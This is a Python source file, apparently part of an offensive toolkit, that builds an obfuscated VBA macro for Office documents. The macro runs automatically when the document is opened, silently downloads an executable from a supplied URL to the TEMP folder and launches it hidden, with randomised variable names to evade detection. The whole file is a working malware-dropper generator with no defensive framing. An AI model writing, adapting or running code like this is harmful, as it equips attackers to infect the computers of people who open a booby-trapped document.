#!/usr/bin/env python3
from ..utils.obfuscation import VBAObfuscator

class DownloadExecuteMacro:
    """Generate macro that downloads and executes payload"""
    
    def __init__(self, payload_url):
        self.payload_url = payload_url
        self.obf = VBAObfuscator()
    
    def generate(self):
        """Create download and execute macro"""
        # Generate random variable names
        func_name = self.obf.random_var()
        var_url = self.obf.random_var()
        var_path = self.obf.random_var()
        var_wc = self.obf.random_var()
        var_shell = self.obf.random_var()
        var_stream = self.obf.random_var()
        
        macro = self.obf.create_auto_open_stubs(func_name)
        
        macro += f'''
Private Sub {func_name}()
    On Error Resume Next
    
    Dim {var_url} As String
    Dim {var_path} As String
    Dim {var_wc} As Object
    Dim {var_shell} As Object
    
    ' URL of payload
    {var_url} = "{self.payload_url}"
    
    ' Download location
    {var_path} = Environ("TEMP") & "\\{self.obf.random_var()}.exe"
    
    ' Download file
    Set {var_wc} = CreateObject("MSXML2.ServerXMLHTTP")
    {var_wc}.Open "GET", {var_url}, False
    {var_wc}.send
    
    If {var_wc}.Status = 200 Then
        Dim {var_stream} As Object
        Set {var_stream} = CreateObject("ADODB.Stream")
        {var_stream}.Open
        {var_stream}.Type = 1
        {var_stream}.Write {var_wc}.responseBody
        {var_stream}.SaveToFile {var_path}, 2
        {var_stream}.Close
        
        ' Execute
        Set {var_shell} = CreateObject("WScript.Shell")
        {var_shell}.Run {var_path}, 0, False
    End If
End Sub
'''
        return macro.strip()